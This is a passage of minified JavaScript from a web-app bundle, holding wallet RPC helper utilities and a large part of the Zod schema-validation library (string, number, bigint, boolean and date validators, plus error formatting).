0}},LE={transactionHash:/^0x(?:[A-Fa-f0-9]{64})$/u,signedMessage:/^0x(?:[a-fA-F0-9]{62,})$/u},Pr={set(t,e){Nn.isClient&&localStorage.setItem(`${me.STORAGE_KEY}${t}`,e)},get(t){return Nn.isClient?localStorage.getItem(`${me.STORAGE_KEY}${t}`):null},delete(t,e){Nn.isClient&&(e?localStorage.removeItem(t):localStorage.removeItem(`${me.STORAGE_KEY}${t}`))}},Gh=30*1e3,Nn={checkIfAllowedToTriggerEmail(){const t=Pr.get(me.LAST_EMAIL_LOGIN_TIME);if(t){const e=Date.now()-Number(t);if(e<Gh){const r=Math.ceil((Gh-e)/1e3);throw new Error(`Please try again after ${r} seconds`)}}},getTimeToNextEmailLogin(){const t=Pr.get(me.LAST_EMAIL_LOGIN_TIME);if(t){const e=Date.now()-Number(t);if(e<Gh)return Math.ceil((Gh-e)/1e3)}return 0},checkIfRequestExists(t){return cr.NOT_SAFE_RPC_METHODS.includes(t.method)||cr.SAFE_RPC_METHODS.includes(t.method)},getResponseType(t){return typeof t=="string"&&((t==null?void 0:t.match(LE.transactionHash))||(t==null?void 0:t.match(LE.signedMessage)))?me.RPC_RESPONSE_TYPE_TX:me.RPC_RESPONSE_TYPE_OBJECT},checkIfRequestIsSafe(t){return cr.SAFE_RPC_METHODS.includes(t.method)},isClient:typeof window<"u"};var Qe;(function(t){t.assertEqual=i=>i;function e(i){}t.assertIs=e;function r(i){throw new Error}t.assertNever=r,t.arrayToEnum=i=>{const s={};for(const o of i)s[o]=o;return s},t.getValidEnumValues=i=>{const s=t.objectKeys(i).filter(a=>typeof i[i[a]]!="number"),o={};for(const a of s)o[a]=i[a];return t.objectValues(o)},t.objectValues=i=>t.objectKeys(i).map(function(s){return i[s]}),t.objectKeys=typeof Object.keys=="function"?i=>Object.keys(i):i=>{const s=[];for(const o in i)Object.prototype.hasOwnProperty.call(i,o)&&s.push(o);return s},t.find=(i,s)=>{for(const o of i)if(s(o))return o},t.isInteger=typeof Number.isInteger=="function"?i=>Number.isInteger(i):i=>typeof i=="number"&&isFinite(i)&&Math.floor(i)===i;function n(i,s=" | "){return i.map(o=>typeof o=="string"?`'${o}'`:o).join(s)}t.joinValues=n,t.jsonStringifyReplacer=(i,s)=>typeof s=="bigint"?s.toString():s})(Qe||(Qe={}));var A0;(function(t){t.mergeShapes=(e,r)=>({...e,...r})})(A0||(A0={}));const ue=Qe.arrayToEnum(["string","nan","number","integer","float","boolean","date","bigint","symbol","function","undefined","null","array","object","unknown","promise","void","never","map","set"]),Hs=t=>{switch(typeof t){case"undefined":return ue.undefined;case"string":return ue.string;case"number":return isNaN(t)?ue.nan:ue.number;case"boolean":return ue.boolean;case"function":return ue.function;case"bigint":return ue.bigint;case"symbol":return ue.symbol;case"object":return Array.isArray(t)?ue.array:t===null?ue.null:t.then&&typeof t.then=="function"&&t.catch&&typeof t.catch=="function"?ue.promise:typeof Map<"u"&&t instanceof Map?ue.map:typeof Set<"u"&&t instanceof Set?ue.set:typeof Date<"u"&&t instanceof Date?ue.date:ue.object;default:return ue.unknown}},re=Qe.arrayToEnum(["invalid_type","invalid_literal","custom","invalid_union","invalid_union_discriminator","invalid_enum_value","unrecognized_keys","invalid_arguments","invalid_return_type","invalid_date","invalid_string","too_small","too_big","invalid_intersection_types","not_multiple_of","not_finite"]),Eq=t=>JSON.stringify(t,null,2).replace(/"([^"]+)":/g,"$1:");class pi extends Error{constructor(e){super(),this.issues=[],this.addIssue=n=>{this.issues=[...this.issues,n]},this.addIssues=(n=[])=>{this.issues=[...this.issues,...n]};const r=new.target.prototype;Object.setPrototypeOf?Object.setPrototypeOf(this,r):this.__proto__=r,this.name="ZodError",this.issues=e}get errors(){return this.issues}format(e){const r=e||function(s){return s.message},n={_errors:[]},i=s=>{for(const o of s.issues)if(o.code==="invalid_union")o.unionErrors.map(i);else if(o.code==="invalid_return_type")i(o.returnTypeError);else if(o.code==="invalid_arguments")i(o.argumentsError);else if(o.path.length===0)n._errors.push(r(o));else{let a=n,c=0;for(;c<o.path.length;){const u=o.path[c];c===o.path.length-1?(a[u]=a[u]||{_errors:[]},a[u]._errors.push(r(o))):a[u]=a[u]||{_errors:[]},a=a[u],c++}}};return i(this),n}toString(){return this.message}get message(){return JSON.stringify(this.issues,Qe.jsonStringifyReplacer,2)}get isEmpty(){return this.issues.length===0}flatten(e=r=>r.message){const r={},n=[];for(const i of this.issues)i.path.length>0?(r[i.path[0]]=r[i.path[0]]||[],r[i.path[0]].push(e(i))):n.push(e(i));return{formErrors:n,fieldErrors:r}}get formErrors(){return this.flatten()}}pi.create=t=>new pi(t);const wl=(t,e)=>{let r;switch(t.code){case re.invalid_type:t.received===ue.undefined?r="Required":r=`Expected ${t.expected}, received ${t.received}`;break;case re.invalid_literal:r=`Invalid literal value, expected ${JSON.stringify(t.expected,Qe.jsonStringifyReplacer)}`;break;case re.unrecognized_keys:r=`Unrecognized key(s) in object: ${Qe.joinValues(t.keys,", ")}`;break;case re.invalid_union:r="Invalid input";break;case re.invalid_union_discriminator:r=`Invalid discriminator value. Expected ${Qe.joinValues(t.options)}`;break;case re.invalid_enum_value:r=`Invalid enum value. Expected ${Qe.joinValues(t.options)}, received '${t.received}'`;break;case re.invalid_arguments:r="Invalid function arguments";break;case re.invalid_return_type:r="Invalid function return type";break;case re.invalid_date:r="Invalid date";break;case re.invalid_string:typeof t.validation=="object"?"includes"in t.validation?(r=`Invalid input: must include "${t.validation.includes}"`,typeof t.validation.position=="number"&&(r=`${r} at one or more positions greater than or equal to ${t.validation.position}`)):"startsWith"in t.validation?r=`Invalid input: must start with "${t.validation.startsWith}"`:"endsWith"in t.validation?r=`Invalid input: must end with "${t.validation.endsWith}"`:Qe.assertNever(t.validation):t.validation!=="regex"?r=`Invalid ${t.validation}`:r="Invalid";break;case re.too_small:t.type==="array"?r=`Array must contain ${t.exact?"exactly":t.inclusive?"at least":"more than"} ${t.minimum} element(s)`:t.type==="string"?r=`String must contain ${t.exact?"exactly":t.inclusive?"at least":"over"} ${t.minimum} character(s)`:t.type==="number"?r=`Number must be ${t.exact?"exactly equal to ":t.inclusive?"greater than or equal to ":"greater than "}${t.minimum}`:t.type==="date"?r=`Date must be ${t.exact?"exactly equal to ":t.inclusive?"greater than or equal to ":"greater than "}${new Date(Number(t.minimum))}`:r="Invalid input";break;case re.too_big:t.type==="array"?r=`Array must contain ${t.exact?"exactly":t.inclusive?"at most":"less than"} ${t.maximum} element(s)`:t.type==="string"?r=`String must contain ${t.exact?"exactly":t.inclusive?"at most":"under"} ${t.maximum} character(s)`:t.type==="number"?r=`Number must be ${t.exact?"exactly":t.inclusive?"less than or equal to":"less than"} ${t.maximum}`:t.type==="bigint"?r=`BigInt must be ${t.exact?"exactly":t.inclusive?"less than or equal to":"less than"} ${t.maximum}`:t.type==="date"?r=`Date must be ${t.exact?"exactly":t.inclusive?"smaller than or equal to":"smaller than"} ${new Date(Number(t.maximum))}`:r="Invalid input";break;case re.custom:r="Invalid input";break;case re.invalid_intersection_types:r="Intersection results could not be merged";break;case re.not_multiple_of:r=`Number must be a multiple of ${t.multipleOf}`;break;case re.not_finite:r="Number must be finite";break;default:r=e.defaultError,Qe.assertNever(t)}return{message:r}};let I2=wl;function Aq(t){I2=t}function Wd(){return I2}const Gd=t=>{const{data:e,path:r,errorMaps:n,issueData:i}=t,s=[...r,...i.path||[]],o={...i,path:s};let a="";const c=n.filter(u=>!!u).slice().reverse();for(const u of c)a=u(o,{data:e,defaultError:a}).message;return{...i,path:s,message:i.message||a}},_q=[];function fe(t,e){const r=Gd({issueData:e,data:t.data,path:t.path,errorMaps:[t.common.contextualErrorMap,t.schemaErrorMap,Wd(),wl].filter(n=>!!n)});t.common.issues.push(r)}class Wr{constructor(){this.value="valid"}dirty(){this.value==="valid"&&(this.value="dirty")}abort(){this.value!=="aborted"&&(this.value="aborted")}static mergeArray(e,r){const n=[];for(const i of r){if(i.status==="aborted")return Ne;i.status==="dirty"&&e.dirty(),n.push(i.value)}return{status:e.value,value:n}}static async mergeObjectAsync(e,r){const n=[];for(const i of r)n.push({key:await i.key,value:await i.value});return Wr.mergeObjectSync(e,n)}static mergeObjectSync(e,r){const n={};for(const i of r){const{key:s,value:o}=i;if(s.status==="aborted"||o.status==="aborted")return Ne;s.status==="dirty"&&e.dirty(),o.status==="dirty"&&e.dirty(),s.value!=="__proto__"&&(typeof o.value<"u"||i.alwaysSet)&&(n[s.value]=o.value)}return{status:e.value,value:n}}}const Ne=Object.freeze({status:"aborted"}),x2=t=>({status:"dirty",value:t}),en=t=>({status:"valid",value:t}),_0=t=>t.status==="aborted",C0=t=>t.status==="dirty",bl=t=>t.status==="valid",Vd=t=>typeof Promise<"u"&&t instanceof Promise;var be;(function(t){t.errToObj=e=>typeof e=="string"?{message:e}:e||{},t.toString=e=>typeof e=="string"?e:e==null?void 0:e.message})(be||(be={}));class Hi{constructor(e,r,n,i){this._cachedPath=[],this.parent=e,this.data=r,this._path=n,this._key=i}get path(){return this._cachedPath.length||(this._key instanceof Array?this._cachedPath.push(...this._path,...this._key):this._cachedPath.push(...this._path,this._key)),this._cachedPath}}const FE=(t,e)=>{if(bl(e))return{success:!0,data:e.value};if(!t.common.issues.length)throw new Error("Validation failed but no issues detected.");return{success:!1,get error(){if(this._error)return this._error;const r=new pi(t.common.issues);return this._error=r,this._error}}};function Re(t){if(!t)return{};const{errorMap:e,invalid_type_error:r,required_error:n,description:i}=t;if(e&&(r||n))throw new Error(`Can't use "invalid_type_error" or "required_error" in conjunction with custom error map.`);return e?{errorMap:e,description:i}:{errorMap:(o,a)=>o.code!=="invalid_type"?{message:a.defaultError}:typeof a.data>"u"?{message:n??a.defaultError}:{message:r??a.defaultError},description:i}}class Me{constructor(e){this.spa=this.safeParseAsync,this._def=e,this.parse=this.parse.bind(this),this.safeParse=this.safeParse.bind(this),this.parseAsync=this.parseAsync.bind(this),this.safeParseAsync=this.safeParseAsync.bind(this),this.spa=this.spa.bind(this),this.refine=this.refine.bind(this),this.refinement=this.refinement.bind(this),this.superRefine=this.superRefine.bind(this),this.optional=this.optional.bind(this),this.nullable=this.nullable.bind(this),this.nullish=this.nullish.bind(this),this.array=this.array.bind(this),this.promise=this.promise.bind(this),this.or=this.or.bind(this),this.and=this.and.bind(this),this.transform=this.transform.bind(this),this.brand=this.brand.bind(this),this.default=this.default.bind(this),this.catch=this.catch.bind(this),this.describe=this.describe.bind(this),this.pipe=this.pipe.bind(this),this.readonly=this.readonly.bind(this),this.isNullable=this.isNullable.bind(this),this.isOptional=this.isOptional.bind(this)}get description(){return this._def.description}_getType(e){return Hs(e.data)}_getOrReturnCtx(e,r){return r||{common:e.parent.common,data:e.data,parsedType:Hs(e.data),schemaErrorMap:this._def.errorMap,path:e.path,parent:e.parent}}_processInputParams(e){return{status:new Wr,ctx:{common:e.parent.common,data:e.data,parsedType:Hs(e.data),schemaErrorMap:this._def.errorMap,path:e.path,parent:e.parent}}}_parseSync(e){const r=this._parse(e);if(Vd(r))throw new Error("Synchronous parse encountered promise.");return r}_parseAsync(e){const r=this._parse(e);return Promise.resolve(r)}parse(e,r){const n=this.safeParse(e,r);if(n.success)return n.data;throw n.error}safeParse(e,r){var n;const i={common:{issues:[],async:(n=r==null?void 0:r.async)!==null&&n!==void 0?n:!1,contextualErrorMap:r==null?void 0:r.errorMap},path:(r==null?void 0:r.path)||[],schemaErrorMap:this._def.errorMap,parent:null,data:e,parsedType:Hs(e)},s=this._parseSync({data:e,path:i.path,parent:i});return FE(i,s)}async parseAsync(e,r){const n=await this.safeParseAsync(e,r);if(n.success)return n.data;throw n.error}async safeParseAsync(e,r){const n={common:{issues:[],contextualErrorMap:r==null?void 0:r.errorMap,async:!0},path:(r==null?void 0:r.path)||[],schemaErrorMap:this._def.errorMap,parent:null,data:e,parsedType:Hs(e)},i=this._parse({data:e,path:n.path,parent:n}),s=await(Vd(i)?i:Promise.resolve(i));return FE(n,s)}refine(e,r){const n=i=>typeof r=="string"||typeof r>"u"?{message:r}:typeof r=="function"?r(i):r;return this._refinement((i,s)=>{const o=e(i),a=()=>s.addIssue({code:re.custom,...n(i)});return typeof Promise<"u"&&o instanceof Promise?o.then(c=>c?!0:(a(),!1)):o?!0:(a(),!1)})}refinement(e,r){return this._refinement((n,i)=>e(n)?!0:(i.addIssue(typeof r=="function"?r(n,i):r),!1))}_refinement(e){return new mi({schema:this,typeName:Ae.ZodEffects,effect:{type:"refinement",refinement:e}})}superRefine(e){return this._refinement(e)}optional(){return ms.create(this,this._def)}nullable(){return ha.create(this,this._def)}nullish(){return this.nullable().optional()}array(){return gi.create(this,this._def)}promise(){return xc.create(this,this._def)}or(e){return _l.create([this,e],this._def)}and(e){return Cl.create(this,e,this._def)}transform(e){return new mi({...Re(this._def),schema:this,typeName:Ae.ZodEffects,effect:{type:"transform",transform:e}})}default(e){const r=typeof e=="function"?e:()=>e;return new Tl({...Re(this._def),innerType:this,defaultValue:r,typeName:Ae.ZodDefault})}brand(){return new N2({typeName:Ae.ZodBranded,type:this,...Re(this._def)})}catch(e){const r=typeof e=="function"?e:()=>e;return new Jd({...Re(this._def),innerType:this,catchValue:r,typeName:Ae.ZodCatch})}describe(e){const r=this.constructor;return new r({...this._def,description:e})}pipe(e){return fh.create(this,e)}readonly(){return Xd.create(this)}isOptional(){return this.safeParse(void 0).success}isNullable(){return this.safeParse(null).success}}const Cq=/^c[^\s-]{8,}$/i,Iq=/^[a-z][a-z0-9]*$/,xq=/^[0-9A-HJKMNP-TV-Z]{26}$/,Sq=/^[0-9a-fA-F]{8}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{4}\b-[0-9a-fA-F]{12}$/i,Nq=/^(?!\.)(?!.*\.\.)([A-Z0-9_+-\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\-]*\.)+[A-Z]{2,}$/i,Tq="^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$";let Rg;const Pq=/^(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))$/,Rq=/^(([a-f0-9]{1,4}:){7}|::([a-f0-9]{1,4}:){0,6}|([a-f0-9]{1,4}:){1}:([a-f0-9]{1,4}:){0,5}|([a-f0-9]{1,4}:){2}:([a-f0-9]{1,4}:){0,4}|([a-f0-9]{1,4}:){3}:([a-f0-9]{1,4}:){0,3}|([a-f0-9]{1,4}:){4}:([a-f0-9]{1,4}:){0,2}|([a-f0-9]{1,4}:){5}:([a-f0-9]{1,4}:){0,1})([a-f0-9]{1,4}|(((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2}))\.){3}((25[0-5])|(2[0-4][0-9])|(1[0-9]{2})|([0-9]{1,2})))$/,Oq=t=>t.precision?t.offset?new RegExp(`^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}\\.\\d{${t.precision}}(([+-]\\d{2}(:?\\d{2})?)|Z)$`):new RegExp(`^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}\\.\\d{${t.precision}}Z$`):t.precision===0?t.offset?new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(([+-]\\d{2}(:?\\d{2})?)|Z)$"):new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}Z$"):t.offset?new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(\\.\\d+)?(([+-]\\d{2}(:?\\d{2})?)|Z)$"):new RegExp("^\\d{4}-\\d{2}-\\d{2}T\\d{2}:\\d{2}:\\d{2}(\\.\\d+)?Z$");function kq(t,e){return!!((e==="v4"||!e)&&Pq.test(t)||(e==="v6"||!e)&&Rq.test(t))}class di extends Me{_parse(e){if(this._def.coerce&&(e.data=String(e.data)),this._getType(e)!==ue.string){const s=this._getOrReturnCtx(e);return fe(s,{code:re.invalid_type,expected:ue.string,received:s.parsedType}),Ne}const n=new Wr;let i;for(const s of this._def.checks)if(s.kind==="min")e.data.length<s.value&&(i=this._getOrReturnCtx(e,i),fe(i,{code:re.too_small,minimum:s.value,type:"string",inclusive:!0,exact:!1,message:s.message}),n.dirty());else if(s.kind==="max")e.data.length>s.value&&(i=this._getOrReturnCtx(e,i),fe(i,{code:re.too_big,maximum:s.value,type:"string",inclusive:!0,exact:!1,message:s.message}),n.dirty());else if(s.kind==="length"){const o=e.data.length>s.value,a=e.data.length<s.value;(o||a)&&(i=this._getOrReturnCtx(e,i),o?fe(i,{code:re.too_big,maximum:s.value,type:"string",inclusive:!0,exact:!0,message:s.message}):a&&fe(i,{code:re.too_small,minimum:s.value,type:"string",inclusive:!0,exact:!0,message:s.message}),n.dirty())}else if(s.kind==="email")Nq.test(e.data)||(i=this._getOrReturnCtx(e,i),fe(i,{validation:"email",code:re.invalid_string,message:s.message}),n.dirty());else if(s.kind==="emoji")Rg||(Rg=new RegExp(Tq,"u")),Rg.test(e.data)||(i=this._getOrReturnCtx(e,i),fe(i,{validation:"emoji",code:re.invalid_string,message:s.message}),n.dirty());else if(s.kind==="uuid")Sq.test(e.data)||(i=this._getOrReturnCtx(e,i),fe(i,{validation:"uuid",code:re.invalid_string,message:s.message}),n.dirty());else if(s.kind==="cuid")Cq.test(e.data)||(i=this._getOrReturnCtx(e,i),fe(i,{validation:"cuid",code:re.invalid_string,message:s.message}),n.dirty());else if(s.kind==="cuid2")Iq.test(e.data)||(i=this._getOrReturnCtx(e,i),fe(i,{validation:"cuid2",code:re.invalid_string,message:s.message}),n.dirty());else if(s.kind==="ulid")xq.test(e.data)||(i=this._getOrReturnCtx(e,i),fe(i,{validation:"ulid",code:re.invalid_string,message:s.message}),n.dirty());else if(s.kind==="url")try{new URL(e.data)}catch{i=this._getOrReturnCtx(e,i),fe(i,{validation:"url",code:re.invalid_string,message:s.message}),n.dirty()}else s.kind==="regex"?(s.regex.lastIndex=0,s.regex.test(e.data)||(i=this._getOrReturnCtx(e,i),fe(i,{validation:"regex",code:re.invalid_string,message:s.message}),n.dirty())):s.kind==="trim"?e.data=e.data.trim():s.kind==="includes"?e.data.includes(s.value,s.position)||(i=this._getOrReturnCtx(e,i),fe(i,{code:re.invalid_string,validation:{includes:s.value,position:s.position},message:s.message}),n.dirty()):s.kind==="toLowerCase"?e.data=e.data.toLowerCase():s.kind==="toUpperCase"?e.data=e.data.toUpperCase():s.kind==="startsWith"?e.data.startsWith(s.value)||(i=this._getOrReturnCtx(e,i),fe(i,{code:re.invalid_string,validation:{startsWith:s.value},message:s.message}),n.dirty()):s.kind==="endsWith"?e.data.endsWith(s.value)||(i=this._getOrReturnCtx(e,i),fe(i,{code:re.invalid_string,validation:{endsWith:s.value},message:s.message}),n.dirty()):s.kind==="datetime"?Oq(s).test(e.data)||(i=this._getOrReturnCtx(e,i),fe(i,{code:re.invalid_string,validation:"datetime",message:s.message}),n.dirty()):s.kind==="ip"?kq(e.data,s.version)||(i=this._getOrReturnCtx(e,i),fe(i,{validation:"ip",code:re.invalid_string,message:s.message}),n.dirty()):Qe.assertNever(s);return{status:n.value,value:e.data}}_regex(e,r,n){return this.refinement(i=>e.test(i),{validation:r,code:re.invalid_string,...be.errToObj(n)})}_addCheck(e){return new di({...this._def,checks:[...this._def.checks,e]})}email(e){return this._addCheck({kind:"email",...be.errToObj(e)})}url(e){return this._addCheck({kind:"url",...be.errToObj(e)})}emoji(e){return this._addCheck({kind:"emoji",...be.errToObj(e)})}uuid(e){return this._addCheck({kind:"uuid",...be.errToObj(e)})}cuid(e){return this._addCheck({kind:"cuid",...be.errToObj(e)})}cuid2(e){return this._addCheck({kind:"cuid2",...be.errToObj(e)})}ulid(e){return this._addCheck({kind:"ulid",...be.errToObj(e)})}ip(e){return this._addCheck({kind:"ip",...be.errToObj(e)})}datetime(e){var r;return typeof e=="string"?this._addCheck({kind:"datetime",precision:null,offset:!1,message:e}):this._addCheck({kind:"datetime",precision:typeof(e==null?void 0:e.precision)>"u"?null:e==null?void 0:e.precision,offset:(r=e==null?void 0:e.offset)!==null&&r!==void 0?r:!1,...be.errToObj(e==null?void 0:e.message)})}regex(e,r){return this._addCheck({kind:"regex",regex:e,...be.errToObj(r)})}includes(e,r){return this._addCheck({kind:"includes",value:e,position:r==null?void 0:r.position,...be.errToObj(r==null?void 0:r.message)})}startsWith(e,r){return this._addCheck({kind:"startsWith",value:e,...be.errToObj(r)})}endsWith(e,r){return this._addCheck({kind:"endsWith",value:e,...be.errToObj(r)})}min(e,r){return this._addCheck({kind:"min",value:e,...be.errToObj(r)})}max(e,r){return this._addCheck({kind:"max",value:e,...be.errToObj(r)})}length(e,r){return this._addCheck({kind:"length",value:e,...be.errToObj(r)})}nonempty(e){return this.min(1,be.errToObj(e))}trim(){return new di({...this._def,checks:[...this._def.checks,{kind:"trim"}]})}toLowerCase(){return new di({...this._def,checks:[...this._def.checks,{kind:"toLowerCase"}]})}toUpperCase(){return new di({...this._def,checks:[...this._def.checks,{kind:"toUpperCase"}]})}get isDatetime(){return!!this._def.checks.find(e=>e.kind==="datetime")}get isEmail(){return!!this._def.checks.find(e=>e.kind==="email")}get isURL(){return!!this._def.checks.find(e=>e.kind==="url")}get isEmoji(){return!!this._def.checks.find(e=>e.kind==="emoji")}get isUUID(){return!!this._def.checks.find(e=>e.kind==="uuid")}get isCUID(){return!!this._def.checks.find(e=>e.kind==="cuid")}get isCUID2(){return!!this._def.checks.find(e=>e.kind==="cuid2")}get isULID(){return!!this._def.checks.find(e=>e.kind==="ulid")}get isIP(){return!!this._def.checks.find(e=>e.kind==="ip")}get minLength(){let e=null;for(const r of this._def.checks)r.kind==="min"&&(e===null||r.value>e)&&(e=r.value);return e}get maxLength(){let e=null;for(const r of this._def.checks)r.kind==="max"&&(e===null||r.value<e)&&(e=r.value);return e}}di.create=t=>{var e;return new di({checks:[],typeName:Ae.ZodString,coerce:(e=t==null?void 0:t.coerce)!==null&&e!==void 0?e:!1,...Re(t)})};function Dq(t,e){const r=(t.toString().split(".")[1]||"").length,n=(e.toString().split(".")[1]||"").length,i=r>n?r:n,s=parseInt(t.toFixed(i).replace(".","")),o=parseInt(e.toFixed(i).replace(".",""));return s%o/Math.pow(10,i)}class io extends Me{constructor(){super(...arguments),this.min=this.gte,this.max=this.lte,this.step=this.multipleOf}_parse(e){if(this._def.coerce&&(e.data=Number(e.data)),this._getType(e)!==ue.number){const s=this._getOrReturnCtx(e);return fe(s,{code:re.invalid_type,expected:ue.number,received:s.parsedType}),Ne}let n;const i=new Wr;for(const s of this._def.checks)s.kind==="int"?Qe.isInteger(e.data)||(n=this._getOrReturnCtx(e,n),fe(n,{code:re.invalid_type,expected:"integer",received:"float",message:s.message}),i.dirty()):s.kind==="min"?(s.inclusive?e.data<s.value:e.data<=s.value)&&(n=this._getOrReturnCtx(e,n),fe(n,{code:re.too_small,minimum:s.value,type:"number",inclusive:s.inclusive,exact:!1,message:s.message}),i.dirty()):s.kind==="max"?(s.inclusive?e.data>s.value:e.data>=s.value)&&(n=this._getOrReturnCtx(e,n),fe(n,{code:re.too_big,maximum:s.value,type:"number",inclusive:s.inclusive,exact:!1,message:s.message}),i.dirty()):s.kind==="multipleOf"?Dq(e.data,s.value)!==0&&(n=this._getOrReturnCtx(e,n),fe(n,{code:re.not_multiple_of,multipleOf:s.value,message:s.message}),i.dirty()):s.kind==="finite"?Number.isFinite(e.data)||(n=this._getOrReturnCtx(e,n),fe(n,{code:re.not_finite,message:s.message}),i.dirty()):Qe.assertNever(s);return{status:i.value,value:e.data}}gte(e,r){return this.setLimit("min",e,!0,be.toString(r))}gt(e,r){return this.setLimit("min",e,!1,be.toString(r))}lte(e,r){return this.setLimit("max",e,!0,be.toString(r))}lt(e,r){return this.setLimit("max",e,!1,be.toString(r))}setLimit(e,r,n,i){return new io({...this._def,checks:[...this._def.checks,{kind:e,value:r,inclusive:n,message:be.toString(i)}]})}_addCheck(e){return new io({...this._def,checks:[...this._def.checks,e]})}int(e){return this._addCheck({kind:"int",message:be.toString(e)})}positive(e){return this._addCheck({kind:"min",value:0,inclusive:!1,message:be.toString(e)})}negative(e){return this._addCheck({kind:"max",value:0,inclusive:!1,message:be.toString(e)})}nonpositive(e){return this._addCheck({kind:"max",value:0,inclusive:!0,message:be.toString(e)})}nonnegative(e){return this._addCheck({kind:"min",value:0,inclusive:!0,message:be.toString(e)})}multipleOf(e,r){return this._addCheck({kind:"multipleOf",value:e,message:be.toString(r)})}finite(e){return this._addCheck({kind:"finite",message:be.toString(e)})}safe(e){return this._addCheck({kind:"min",inclusive:!0,value:Number.MIN_SAFE_INTEGER,message:be.toString(e)})._addCheck({kind:"max",inclusive:!0,value:Number.MAX_SAFE_INTEGER,message:be.toString(e)})}get minValue(){let e=null;for(const r of this._def.checks)r.kind==="min"&&(e===null||r.value>e)&&(e=r.value);return e}get maxValue(){let e=null;for(const r of this._def.checks)r.kind==="max"&&(e===null||r.value<e)&&(e=r.value);return e}get isInt(){return!!this._def.checks.find(e=>e.kind==="int"||e.kind==="multipleOf"&&Qe.isInteger(e.value))}get isFinite(){let e=null,r=null;for(const n of this._def.checks){if(n.kind==="finite"||n.kind==="int"||n.kind==="multipleOf")return!0;n.kind==="min"?(r===null||n.value>r)&&(r=n.value):n.kind==="max"&&(e===null||n.value<e)&&(e=n.value)}return Number.isFinite(r)&&Number.isFinite(e)}}io.create=t=>new io({checks:[],typeName:Ae.ZodNumber,coerce:(t==null?void 0:t.coerce)||!1,...Re(t)});class so extends Me{constructor(){super(...arguments),this.min=this.gte,this.max=this.lte}_parse(e){if(this._def.coerce&&(e.data=BigInt(e.data)),this._getType(e)!==ue.bigint){const s=this._getOrReturnCtx(e);return fe(s,{code:re.invalid_type,expected:ue.bigint,received:s.parsedType}),Ne}let n;const i=new Wr;for(const s of this._def.checks)s.kind==="min"?(s.inclusive?e.data<s.value:e.data<=s.value)&&(n=this._getOrReturnCtx(e,n),fe(n,{code:re.too_small,type:"bigint",minimum:s.value,inclusive:s.inclusive,message:s.message}),i.dirty()):s.kind==="max"?(s.inclusive?e.data>s.value:e.data>=s.value)&&(n=this._getOrReturnCtx(e,n),fe(n,{code:re.too_big,type:"bigint",maximum:s.value,inclusive:s.inclusive,message:s.message}),i.dirty()):s.kind==="multipleOf"?e.data%s.value!==BigInt(0)&&(n=this._getOrReturnCtx(e,n),fe(n,{code:re.not_multiple_of,multipleOf:s.value,message:s.message}),i.dirty()):Qe.assertNever(s);return{status:i.value,value:e.data}}gte(e,r){return this.setLimit("min",e,!0,be.toString(r))}gt(e,r){return this.setLimit("min",e,!1,be.toString(r))}lte(e,r){return this.setLimit("max",e,!0,be.toString(r))}lt(e,r){return this.setLimit("max",e,!1,be.toString(r))}setLimit(e,r,n,i){return new so({...this._def,checks:[...this._def.checks,{kind:e,value:r,inclusive:n,message:be.toString(i)}]})}_addCheck(e){return new so({...this._def,checks:[...this._def.checks,e]})}positive(e){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!1,message:be.toString(e)})}negative(e){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!1,message:be.toString(e)})}nonpositive(e){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!0,message:be.toString(e)})}nonnegative(e){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!0,message:be.toString(e)})}multipleOf(e,r){return this._addCheck({kind:"multipleOf",value:e,message:be.toString(r)})}get minValue(){let e=null;for(const r of this._def.checks)r.kind==="min"&&(e===null||r.value>e)&&(e=r.value);return e}get maxValue(){let e=null;for(const r of this._def.checks)r.kind==="max"&&(e===null||r.value<e)&&(e=r.value);return e}}so.create=t=>{var e;return new so({checks:[],typeName:Ae.ZodBigInt,coerce:(e=t==null?void 0:t.coerce)!==null&&e!==void 0?e:!1,...Re(t)})};class vl extends Me{_parse(e){if(this._def.coerce&&(e.data=!!e.data),this._getType(e)!==ue.boolean){const n=this._getOrReturnCtx(e);return fe(n,{code:re.invalid_type,expected:ue.boolean,received:n.parsedType}),Ne}return en(e.data)}}vl.create=t=>new vl({typeName:Ae.ZodBoolean,coerce:(t==null?void 0:t.coerce)||!1,...Re(t)});class ua extends Me{_parse(e){if(this._def.coerce&&(e.data=new Date(e.data)),this._getType(e)!==ue.date){const s=this._getOrReturnCtx(e);return fe(s,{code:re.invalid_type,expected:ue.date,received:s.parsedType}),Ne}if(isNaN(e.data.getTime())){const s=this._getOrReturnCtx(e);return fe(s,{code:re.invalid_date}),Ne}const n=new Wr;let i;for(const s of this._def.checks)s.kind==="min"?e.data.getTime()<s.value&&(i=this._getOrReturnCtx(e,i),fe(i,{code:re.too_small,message:s.message,inclusive:!0,exact:!1,minimum:s.value,type:"date"}),n.dirty()):s.kind==="max"?e.data.getTime()>s.value&&(i=this._getOrReturnCtx(e,i),fe(i,{code:re.too_big,message:s.message,inclusive:!0,exact:!1,maximum:s.value,type:"date"}),n.dirty()):Qe.assertNever(s);return{status:n.value,value:new Date(e.data.getTime())}}_addCheck(e){return new ua({...this._def,checks:[...this._def.checks,e]})}min(e,r){return this._addCheck({kind:"min",value:e.getTime(),message:be.toString(r)})}max(e,r){return this._addCheck({kind:"max",value:e.getTime(),message:be.toString(r)})}get minDate(){let e=null;for(const r of this._def.checks)r.kind==="min"&&(e===null||r.value>e)&&(e=r.value);return e!=null?new Date(e):null}get maxDate(){let e=null;for(const r of this._def.checks)r.kind==="max"&&(e===null||r.value<e)&&(e=r.value);return e!=null?new Date(e):null}}ua.create=t=>new ua({checks:[],coerce:(t==null?void 